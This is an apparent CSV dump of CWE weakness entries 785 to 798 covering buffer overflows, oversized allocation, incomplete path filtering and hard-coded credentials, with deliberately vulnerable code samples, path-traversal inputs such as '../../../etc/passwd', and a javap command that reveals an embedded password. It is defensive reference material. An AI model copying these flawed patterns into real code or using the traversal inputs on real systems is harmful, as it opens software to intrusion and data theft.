CWE-785: Use of Path Manipulation Function without Maximum-sized Buffer,"The product invokes a function for normalizing paths or file names, but it provides an output buffer that is smaller than the maximum possible size, such as PATH_MAX.","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Modify Memory; Execute Unauthorized Code or Commands; DoS: Crash, Exit, or Restart, Likelihood: ","Example 1In this example the function creates a directory named ""output\<name>"" in the current directory and returns a heap-allocated copy of its name.(bad code)Example Language:Cchar *createOutputDirectory(char *name) {char outputDirectoryName[128];if (getCurrentDirectory(128, outputDirectoryName) == 0) {return null;}if (!PathAppend(outputDirectoryName, ""output"")) {return null;}if (!PathAppend(outputDirectoryName, name)) {return null;}if (SHCreateDirectoryEx(NULL, outputDirectoryName, NULL) != ERROR_SUCCESS) {return null;}return StrDup(outputDirectoryName);}For most values of the current directory and the name parameter, this function will work properly. However, if the name parameter is particularly long, then the second call to PathAppend() could overflow the outputDirectoryName buffer, which is smaller than MAX_PATH bytes.",Phase:  ImplementationAlways specify output buffers large enough to handle the maximum-size possible result from path manipulation functions.
CWE-786: Access of Memory Location Before Start of Buffer,The product reads or writes to a buffer using an index or pointer that references a memory location prior to the beginning of the buffer.,"Scope: Confidentiality, Impact: Technical Impact:Read MemoryFor an out-of-bounds read, the attacker may have access to sensitive information. If the sensitive information contains system details, such as the current buffers position in memory, this knowledge can be used to craft further attacks, possibly with more severe consequences., Likelihood: ; Scope: IntegrityAvailability, Impact: Technical Impact:Modify Memory; DoS: Crash, Exit, or RestartOut of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Memory; Execute Unauthorized Code or CommandsIf the corrupted memory can be effectively controlled, it may be possible to execute arbitrary code. If the corrupted memory is data rather than instructions, the system will continue to function with improper changes, possibly in violation of an implicit or explicit policy., Likelihood: ","Example 1In the following C/C++ example, a utility function is used to trim trailing whitespace from a character string. The function copies the input string to a local character string and uses a while statement to remove the trailing whitespace by moving backward through the string and overwriting whitespace with a NUL character.(bad code)Example Language:Cchar* trimTrailingWhitespace(char *strMessage, int length) {char *retMessage;char *message = malloc(sizeof(char)*(length+1));// copy input string to a temporary stringchar message[length+1];int index;for (index = 0; index < length; index++) {message[index] = strMessage[index];}message[index] = '\0';// trim trailing whitespaceint len = index-1;while (isspace(message[len])) {message[len] = '\0';len--;}// return string without trailing whitespaceretMessage = message;return retMessage;}However, this function can cause a buffer underwrite if the input character string contains all whitespace. On some systems the while statement will move backwards past the beginning of a character string and will call the isspace() function on an address outside of the bounds of the local buffer.Example 2The following example asks a user for an offset into an array to select an item.(bad code)Example Language:Cint main (int argc, char **argv) {char *items[] = {""boat"", ""car"", ""truck"", ""train""};int index = GetUntrustedOffset();printf(""You selected %s\n"", items[index-1]);}The programmer allows the user to specify which element in the list to select, however an attacker can provide an out-of-bounds offset, resulting in a buffer over-read (CWE-126).Example 3The following is an example of code that may result in a buffer underwrite. This code is attempting to replace the substring ""Replace Me"" in destBuf with the string stored in srcBuf. It does so by using the function strstr(), which returns a pointer to the found substring in destBuf.  Using pointer arithmetic, the starting index of the substring is found.(bad code)Example Language:Cint main() {...char *result = strstr(destBuf, ""Replace Me"");int idx = result - destBuf;strcpy(&destBuf[idx], srcBuf);...}In the case where the substring is not found in destBuf, strstr() will return NULL, causing the pointer arithmetic to be undefined, potentially setting the value of idx to a negative number.  If idx is negative, this will result in a buffer underwrite of destBuf.",无可能的缓解方案
CWE-787: Out-of-bounds Write,"The product writes data past the end, or before the beginning, of the intended buffer.","Scope: IntegrityAvailability, Impact: Technical Impact:Modify Memory; DoS: Crash, Exit, or Restart; Execute Unauthorized Code or Commands, Likelihood: ","Example 1The following code attempts to save four different identification numbers into an array.(bad code)Example Language:Cint id_sequence[3];/* Populate the id array. */id_sequence[0] = 123;id_sequence[1] = 234;id_sequence[2] = 345;id_sequence[3] = 456;Since the array is only allocated to hold three elements, the valid indices are 0 to 2; so, the assignment to id_sequence[3] is out of bounds.Example 2In the following code, it is possible to request that memcpy move a much larger segment of memory than assumed:(bad code)Example Language:Cint returnChunkSize(void *) {/* if chunk info is valid, return the size of usable memory,* else, return -1 to indicate an error*/...}int main() {...memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));...}If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation (CWE-252), so -1 can be passed as the size argument to memcpy() (CWE-805). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 (CWE-195), and therefore will copy far more memory than is likely available to the destination buffer (CWE-787,CWE-788).Example 3This code takes an IP address from the user and verifies that it is well formed. It then looks up the hostname and copies it into a buffer.(bad code)Example Language:Cvoid host_lookup(char *user_supplied_addr){struct hostent *hp;in_addr_t *addr;char hostname[64];in_addr_t inet_addr(const char *cp);/*routine that ensures user_supplied_addr is in the right format for conversion */validate_addr_form(user_supplied_addr);addr = inet_addr(user_supplied_addr);hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);strcpy(hostname, hp->h_name);}This function allocates a buffer of 64 bytes to store the hostname. However, there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then the function may overwrite sensitive data or even relinquish control flow to the attacker.Note that this example also contains an unchecked return value (CWE-252) that can lead to a NULL pointer dereference (CWE-476).Example 4This code applies an encoding procedure to an input string and stores it into a buffer.(bad code)Example Language:Cchar * copy_input(char *user_supplied_string){int i, dst_index;char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);if ( MAX_SIZE <= strlen(user_supplied_string) ){die(""user string too long, die evil hacker!"");}dst_index = 0;for ( i = 0; i < strlen(user_supplied_string); i++ ){if( '&' == user_supplied_string[i] ){dst_buf[dst_index++] = '&';dst_buf[dst_index++] = 'a';dst_buf[dst_index++] = 'm';dst_buf[dst_index++] = 'p';dst_buf[dst_index++] = ';';}else if ('<' == user_supplied_string[i] ){/* encode to &lt; */}else dst_buf[dst_index++] = user_supplied_string[i];}return dst_buf;}The programmer attempts to encode the ampersand character in the user-controlled string. However, the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands.Example 5In the following C/C++ code, a utility function is used to trim trailing whitespace from a character string. The function copies the input string to a local character string and uses a while statement to remove the trailing whitespace by moving backward through the string and overwriting whitespace with a NUL character.(bad code)Example Language:Cchar* trimTrailingWhitespace(char *strMessage, int length) {char *retMessage;char *message = malloc(sizeof(char)*(length+1));// copy input string to a temporary stringchar message[length+1];int index;for (index = 0; index < length; index++) {message[index] = strMessage[index];}message[index] = '\0';// trim trailing whitespaceint len = index-1;while (isspace(message[len])) {message[len] = '\0';len--;}// return string without trailing whitespaceretMessage = message;return retMessage;}However, this function can cause a buffer underwrite if the input character string contains all whitespace. On some systems the while statement will move backwards past the beginning of a character string and will call the isspace() function on an address outside of the bounds of the local buffer.Example 6The following code allocates memory for a maximum number of widgets. It then gets a user-specified number of widgets, making sure that the user does not request too many. It then initializes the elements of the array using InitializeWidget(). Because the number of widgets can vary for each request, the code inserts a NULL pointer to signify the location of the last widget.(bad code)Example Language:Cint i;unsigned int numWidgets;Widget **WidgetList;numWidgets = GetUntrustedSizeValue();if ((numWidgets == 0) || (numWidgets > MAX_NUM_WIDGETS)) {ExitError(""Incorrect number of widgets requested!"");}WidgetList = (Widget **)malloc(numWidgets * sizeof(Widget *));printf(""WidgetList ptr=%p\n"", WidgetList);for(i=0; i<numWidgets; i++) {WidgetList[i] = InitializeWidget();}WidgetList[numWidgets] = NULL;showWidgets(WidgetList);However, this code contains an off-by-one calculation error (CWE-193). It allocates exactly enough space to contain the specified number of widgets, but it does not include the space for the NULL pointer. As a result, the allocated buffer is smaller than it is supposed to be (CWE-131). So if the user ever requests MAX_NUM_WIDGETS, there is an out-of-bounds write (CWE-787) when the NULL is assigned. Depending on the environment and compilation settings, this could cause memory corruption.Example 7The following is an example of code that may result in a buffer underwrite. This code is attempting to replace the substring ""Replace Me"" in destBuf with the string stored in srcBuf. It does so by using the function strstr(), which returns a pointer to the found substring in destBuf.  Using pointer arithmetic, the starting index of the substring is found.(bad code)Example Language:Cint main() {...char *result = strstr(destBuf, ""Replace Me"");int idx = result - destBuf;strcpy(&destBuf[idx], srcBuf);...}In the case where the substring is not found in destBuf, strstr() will return NULL, causing the pointer arithmetic to be undefined, potentially setting the value of idx to a negative number.  If idx is negative, this will result in a buffer underwrite of destBuf.","Phase:  RequirementsStrategy:  Language SelectionUse a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.Note:This is not a complete solution, since many buffer overflows are not related to strings.Phases:  Operation; Build and CompilationStrategy:  Environment HardeningUse automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking.D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.Effectiveness: Defense in DepthNote:This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application.Phase:  ImplementationConsider adhering to the following rules when allocating and managing an application's memory:Double check that the buffer is as large as specified.When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.Check buffer boundaries if accessing the buffer in a loop and make sure there is no danger of writing past the allocated space.If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.Phases:  Operation; Build and CompilationStrategy:  Environment HardeningRun or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as ""rebasing"" (for Windows) and ""prelinking"" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking.For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].Effectiveness: Defense in DepthNote:These techniques do not provide a complete solution. For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]Phase:  OperationStrategy:  Environment HardeningUse a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment.For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].Effectiveness: Defense in DepthNote:This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application.Phase:  ImplementationReplace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.Effectiveness: ModerateNote:This approach is still susceptible to calculation errors, including issues such as off-by-one errors (CWE-193) and incorrectly calculating buffer lengths (CWE-131)."
CWE-788: Access of Memory Location After End of Buffer,The product reads or writes to a buffer using an index or pointer that references a memory location after the end of the buffer.,"Scope: Confidentiality, Impact: Technical Impact:Read MemoryFor an out-of-bounds read, the attacker may have access to sensitive information. If the sensitive information contains system details, such as the current buffers position in memory, this knowledge can be used to craft further attacks, possibly with more severe consequences., Likelihood: ; Scope: IntegrityAvailability, Impact: Technical Impact:Modify Memory; DoS: Crash, Exit, or RestartOut of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Memory; Execute Unauthorized Code or CommandsIf the memory accessible by the attacker can be effectively controlled, it may be possible to execute arbitrary code, as with a standard buffer overflow. If the attacker can overwrite a pointer's worth of memory (usually 32 or 64 bits), they can redirect a function pointer to their own malicious code. Even when the attacker can only modify a single byte arbitrary code execution can be possible. Sometimes this is because the same problem can be exploited repeatedly to the same effect. Other times it is because the attacker can overwrite security-critical application-specific data -- such as a flag indicating whether the user is an administrator., Likelihood:","Example 1This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.(bad code)Example Language:Cvoid host_lookup(char *user_supplied_addr){struct hostent *hp;in_addr_t *addr;char hostname[64];in_addr_t inet_addr(const char *cp);/*routine that ensures user_supplied_addr is in the right format for conversion */validate_addr_form(user_supplied_addr);addr = inet_addr(user_supplied_addr);hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);strcpy(hostname, hp->h_name);}This function allocates a buffer of 64 bytes to store the hostname, however there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then the function may overwrite sensitive data or even relinquish control flow to the attacker.Note that this example also contains an unchecked return value (CWE-252) that can lead to a NULL pointer dereference (CWE-476).Example 2In the following example, it is possible to request that memcpy move a much larger segment of memory than assumed:(bad code)Example Language:Cint returnChunkSize(void *) {/* if chunk info is valid, return the size of usable memory,* else, return -1 to indicate an error*/...}int main() {...memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));...}If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation (CWE-252), so -1 can be passed as the size argument to memcpy() (CWE-805). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 (CWE-195), and therefore will copy far more memory than is likely available to the destination buffer (CWE-787,CWE-788).Example 3This example applies an encoding procedure to an input string and stores it into a buffer.(bad code)Example Language:Cchar * copy_input(char *user_supplied_string){int i, dst_index;char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);if ( MAX_SIZE <= strlen(user_supplied_string) ){die(""user string too long, die evil hacker!"");}dst_index = 0;for ( i = 0; i < strlen(user_supplied_string); i++ ){if( '&' == user_supplied_string[i] ){dst_buf[dst_index++] = '&';dst_buf[dst_index++] = 'a';dst_buf[dst_index++] = 'm';dst_buf[dst_index++] = 'p';dst_buf[dst_index++] = ';';}else if ('<' == user_supplied_string[i] ){/* encode to &lt; */}else dst_buf[dst_index++] = user_supplied_string[i];}return dst_buf;}The programmer attempts to encode the ampersand character in the user-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands.Example 4In the following C/C++ example the method processMessageFromSocket() will get a message from a socket, placed into a buffer, and will parse the contents of the buffer into a structure that contains the message length and the message body. A for loop is used to copy the message body into a local character string which will be passed to another method for processing.(bad code)Example Language:Cint processMessageFromSocket(int socket) {int success;char buffer[BUFFER_SIZE];char message[MESSAGE_SIZE];// get message from socket and store into buffer//Ignoring possibliity that buffer > BUFFER_SIZEif (getMessage(socket, buffer, BUFFER_SIZE) > 0) {// place contents of the buffer into message structureExMessage *msg = recastBuffer(buffer);// copy message body into string for processingint index;for (index = 0; index < msg->msgLength; index++) {message[index] = msg->msgBody[index];}message[index] = '\0';// process messagesuccess = processMessage(message);}return success;}However, the message length variable from the structure is used as the condition for ending the for loop without validating that the message length variable accurately reflects the length of the message body (CWE-606). This can result in a buffer over-read (CWE-125) by reading from memory beyond the bounds of the buffer if the message length variable indicates a length that is longer than the size of a message body (CWE-130).",无可能的缓解方案
CWE-789: Memory Allocation with Excessive Size Value,"The product allocates memory based on an untrusted, large size value, but it does not ensure that the size is within expected limits, allowing arbitrary amounts of memory to be allocated.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (Memory)Not controlling memory allocation can result in a request for too much system memory, possibly leading to a crash of the application due to out-of-memory conditions, or the consumption of a large amount of memory on the system., Likelihood: ","Example 1Consider the following code, which accepts an untrusted size value and allocates a buffer to contain a string of the given size.(bad code)Example Language:Cunsigned int size = GetUntrustedInt();/* ignore integer overflow (CWE-190) for this example */unsigned int totBytes = size * sizeof(char);char *string = (char *)malloc(totBytes);InitializeString(string);Suppose an attacker provides a size value of:12345678This will cause 305,419,896 bytes (over 291 megabytes) to be allocated for the string.Example 2Consider the following code, which accepts an untrusted size value and uses the size as an initial capacity for a HashMap.(bad code)Example Language:Javaunsigned int size = GetUntrustedInt();HashMap list = new HashMap(size);The HashMap constructor will verify that the initial capacity is not negative, however there is no check in place to verify that sufficient memory is present. If the attacker provides a large enough value, the application will run into an OutOfMemoryError.Example 3This code performs a stack allocation based on a length calculation.(bad code)Example Language:Cint a = 5, b = 6;size_t len = a - b;char buf[len];    // Just blows up the stack}Since a and b are declared as signed ints, the ""a - b"" subtraction gives a negative result (-1). However, since len is declared to be unsigned, len is cast to an extremely large positive number (on 32-bit systems - 4294967295). As a result, the buffer buf[len] declaration uses an extremely large size to allocate on the stack, very likely more than the entire computer's memory space.Miscalculations usually will not be so obvious. The calculation will either be complicated or the result of an attacker's input to attain the negative value.Example 4This example shows a typical attempt to parse a string with an error resulting from a difference in assumptions between the caller to a function and the function's action.(bad code)Example Language:Cint proc_msg(char *s, int msg_len){// Note space at the end of the string - assume all strings have preamble with spaceint pre_len = sizeof(""preamble: "");char buf[pre_len - msg_len];... Do processing here if we get this far}char *s = ""preamble: message\n"";char *sl = strchr(s, ':');        // Number of characters up to ':' (not including space)int jnklen = sl == NULL ? 0 : sl - s;    // If undefined pointer, use zero lengthint ret_val = proc_msg (""s"",  jnklen);    // Violate assumption of preamble length, end up with negative value, blow out stackThe buffer length ends up being -1, resulting in a blown out stack. The space character after the colon is included in the function calculation, but not in the caller's calculation. This, unfortunately, is not usually so obvious but exists in an obtuse series of calculations.Example 5The following code obtains an untrusted number that is used as an index into an array of messages.(bad code)Example Language:Perlmy $num = GetUntrustedNumber();my @messages = ();$messages[$num] = ""Hello World"";The index is not validated at all (CWE-129), so it might be possible for an attacker to modify an element in @messages that was not intended. If an index is used that is larger than the current size of the array, the Perl interpreter automatically expands the array so that the large index works.If $num is a large value such as 2147483648 (1<<31), then the assignment to $messages[$num] would attempt to create a very large array, then eventually produce an error message such as:Out of memory during array extendThis memory exhaustion will cause the Perl program to exit, possibly a denial of service. In addition, the lack of memory could also prevent many other programs from successfully running on the system.Example 6This example shows a typical attempt to parse a string with an error resulting from a difference in assumptions between the caller to a function and the function's action. The buffer length ends up being -1 resulting in a blown out stack. The space character after the colon is included  in the function calculation, but not in the caller's calculation. This, unfortunately, is not usually so obvious but exists in an obtuse series of calculations.(bad code)Example Language:Cint proc_msg(char *s, int msg_len){int pre_len = sizeof(""preamble: "");    // Note space at the end of the string - assume all strings have preamble with spacechar buf[pre_len - msg_len];... Do processing here and set statusreturn status;}char *s = ""preamble: message\n"";char *sl = strchr(s, ':');        // Number of characters up to ':' (not including space)int jnklen = sl == NULL ? 0 : sl - s;    // If undefined pointer, use zero lengthint ret_val = proc_msg (""s"",  jnklen);    // Violate assumption of preamble length, end up with negative value, blow out stack(good code)Example Language:Cint proc_msg(char *s, int msg_len){int pre_len = sizeof(""preamble: "");    // Note space at the end of the string - assume all strings have preamble with spaceif (pre_len <= msg_len) { // Log error; return error_code; }char buf[pre_len - msg_len];... Do processing here and set statusreturn status;}char *s = ""preamble: message\n"";char *sl = strchr(s, ':');        // Number of characters up to ':' (not including space)int jnklen = sl == NULL ? 0 : sl - s;    // If undefined pointer, use zero lengthint ret_val = proc_msg (""s"",  jnklen);    // Violate assumption of preamble length, end up with negative value, blow out stack","Phases:  Implementation; Architecture and DesignPerform adequate input validation against any value that influences the amount of memory that is allocated. Define an appropriate strategy for handling requests that exceed the limit, and consider supporting a configuration option so that the administrator can extend the amount of memory to be used if necessary.Phase:  OperationRun your program using system-provided resource limits for memory. This might still cause the program to crash or exit, but the impact to the rest of the system will be minimized."
CWE-790: Improper Filtering of Special Elements,"The product receives data from an upstream component, but does not filter or incorrectly filters special elements before sending it to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1The following code takes untrusted input and uses a regular expression to filter ""../"" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.(bad code)Example Language:Perlmy $Username = GetUntrustedInput();$Username =~ s/\.\.\///;my $filename = ""/home/user/"" . $Username;ReadAndSendFile($filename);Since the regular expression does not have the /g global match modifier, it only removes the first instance of ""../"" it comes across. So an input value such as:(attack code)../../../etc/passwdwill have the first ""../"" stripped, resulting in:(result)../../etc/passwdThis value is then concatenated with the /home/user/ directory:(result)/home/user/../../etc/passwdwhich causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23).",无可能的缓解方案
CWE-791: Incomplete Filtering of Special Elements,"The product receives data from an upstream component, but does not completely filter special elements before sending it to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1The following code takes untrusted input and uses a regular expression to filter ""../"" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.(bad code)Example Language:Perlmy $Username = GetUntrustedInput();$Username =~ s/\.\.\///;my $filename = ""/home/user/"" . $Username;ReadAndSendFile($filename);Since the regular expression does not have the /g global match modifier, it only removes the first instance of ""../"" it comes across. So an input value such as:(attack code)../../../etc/passwdwill have the first ""../"" stripped, resulting in:(result)../../etc/passwdThis value is then concatenated with the /home/user/ directory:(result)/home/user/../../etc/passwdwhich causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23).",无可能的缓解方案
CWE-792: Incomplete Filtering of One or More Instances of Special Elements,"The product receives data from an upstream component, but does not completely filter one or more instances of special elements before sending it to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1The following code takes untrusted input and uses a regular expression to filter ""../"" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.(bad code)Example Language:Perlmy $Username = GetUntrustedInput();$Username =~ s/\.\.\///;my $filename = ""/home/user/"" . $Username;ReadAndSendFile($filename);Since the regular expression does not have the /g global match modifier, it only removes the first instance of ""../"" it comes across. So an input value such as:(attack code)../../../etc/passwdwill have the first ""../"" stripped, resulting in:(result)../../etc/passwdThis value is then concatenated with the /home/user/ directory:(result)/home/user/../../etc/passwdwhich causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23).",无可能的缓解方案
CWE-793: Only Filtering One Instance of a Special Element,"The product receives data from an upstream component, but only filters a single instance of a special element before sending it to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1The following code takes untrusted input and uses a regular expression to filter ""../"" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.(bad code)Example Language:Perlmy $Username = GetUntrustedInput();$Username =~ s/\.\.\///;my $filename = ""/home/user/"" . $Username;ReadAndSendFile($filename);Since the regular expression does not have the /g global match modifier, it only removes the first instance of ""../"" it comes across. So an input value such as:(attack code)../../../etc/passwdwill have the first ""../"" stripped, resulting in:(result)../../etc/passwdThis value is then concatenated with the /home/user/ directory:(result)/home/user/../../etc/passwdwhich causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23).",无可能的缓解方案
CWE-794: Incomplete Filtering of Multiple Instances of Special Elements,"The product receives data from an upstream component, but does not filter all instances of a special element before sending it to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1The following code takes untrusted input and uses a regular expression to filter ""../"" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.(bad code)Example Language:Perlmy $Username = GetUntrustedInput();$Username =~ s/\.\.\///;my $filename = ""/home/user/"" . $Username;ReadAndSendFile($filename);Since the regular expression does not have the /g global match modifier, it only removes the first instance of ""../"" it comes across. So an input value such as:(attack code)../../../etc/passwdwill have the first ""../"" stripped, resulting in:(result)../../etc/passwdThis value is then concatenated with the /home/user/ directory:(result)/home/user/../../etc/passwdwhich causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23).",无可能的缓解方案
CWE-795: Only Filtering Special Elements at a Specified Location,"The product receives data from an upstream component, but only accounts for special elements at a specified location, thereby missing remaining special elements that may exist before sending it to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1The following code takes untrusted input and uses a regular expression to filter a ""../"" element located at the beginning of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.(bad code)Example Language:Perlmy $Username = GetUntrustedInput();$Username =~ s/^\.\.\///;my $filename = ""/home/user/"" . $Username;ReadAndSendFile($filename);Since the regular expression is only looking for an instance of ""../"" at the beginning of the string, it only removes the first ""../"" element. So an input value such as:(attack code)../../../etc/passwdwill have the first ""../"" stripped, resulting in:(result)../../etc/passwdThis value is then concatenated with the /home/user/ directory:(result)/home/user/../../etc/passwdwhich causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-22).Example 2The following code takes untrusted input and uses a substring function to filter a 3-character ""../"" element located at the 0-index position of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.(bad code)Example Language:Perlmy $Username = GetUntrustedInput();if (substr($Username, 0, 3) eq '../') {$Username = substr($Username, 3);}my $filename = ""/home/user/"" . $Username;ReadAndSendFile($filename);Since the if function is only looking for a substring of ""../"" between the 0 and 2 position, it only removes that specific ""../"" element. So an input value such as:(attack code)../../../etc/passwdwill have the first ""../"" filtered, resulting in:(result)../../etc/passwdThis value is then concatenated with the /home/user/ directory:(result)/home/user/../../etc/passwdwhich causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-22).",无可能的缓解方案
CWE-796: Only Filtering Special Elements Relative to a Marker,"The product receives data from an upstream component, but only accounts for special elements positioned relative to a marker (e.g. ""at the beginning/end of a string; the second argument""), thereby missing remaining special elements that may exist before sending it to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1The following code takes untrusted input and uses a regular expression to filter a ""../"" element located at the beginning of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.(bad code)Example Language:Perlmy $Username = GetUntrustedInput();$Username =~ s/^\.\.\///;my $filename = ""/home/user/"" . $Username;ReadAndSendFile($filename);Since the regular expression is only looking for an instance of ""../"" at the beginning of the string, it only removes the first ""../"" element. So an input value such as:(attack code)../../../etc/passwdwill have the first ""../"" stripped, resulting in:(result)../../etc/passwdThis value is then concatenated with the /home/user/ directory:(result)/home/user/../../etc/passwdwhich causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-22).",无可能的缓解方案
CWE-797: Only Filtering Special Elements at an Absolute Position,"The product receives data from an upstream component, but only accounts for special elements at an absolute position (e.g. ""byte number 10""), thereby missing remaining special elements that may exist before sending it to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1The following code takes untrusted input and uses a substring function to filter a 3-character ""../"" element located at the 0-index position of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.(bad code)Example Language:Perlmy $Username = GetUntrustedInput();if (substr($Username, 0, 3) eq '../') {$Username = substr($Username, 3);}my $filename = ""/home/user/"" . $Username;ReadAndSendFile($filename);Since the if function is only looking for a substring of ""../"" between the 0 and 2 position, it only removes that specific ""../"" element. So an input value such as:(attack code)../../../etc/passwdwill have the first ""../"" filtered, resulting in:(result)../../etc/passwdThis value is then concatenated with the /home/user/ directory:(result)/home/user/../../etc/passwdwhich causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-22).",无可能的缓解方案
CWE-798: Use of Hard-coded Credentials,"The product contains hard-coded credentials, such as a password or cryptographic key, which it uses for its own inbound authentication, outbound communication to external components, or encryption of internal data.","Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismIf hard-coded passwords are used, it is almost certain that malicious users will gain access to the account in question., Likelihood: ; Scope: IntegrityConfidentialityAvailabilityAccess ControlOther, Impact: Technical Impact:Read Application Data; Gain Privileges or Assume Identity; Execute Unauthorized Code or Commands; OtherThis weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code., Likelihood: ","Example 1The following code uses a hard-coded password to connect to a database:(bad code)Example Language:Java...DriverManager.getConnection(url, ""scott"", ""tiger"");...This is an example of an external hard-coded password on the client-side of a connection. This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user ""scott"" with a password of ""tiger"" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:(attack code)javap -c ConnMngr.class22: ldc #36; //String jdbc:mysql://ixne.com/rxsql24: ldc #38; //String scott26: ldc #17; //String tigerExample 2The following code is an example of an internal hard-coded password in the back-end:(bad code)Example Language:Cint 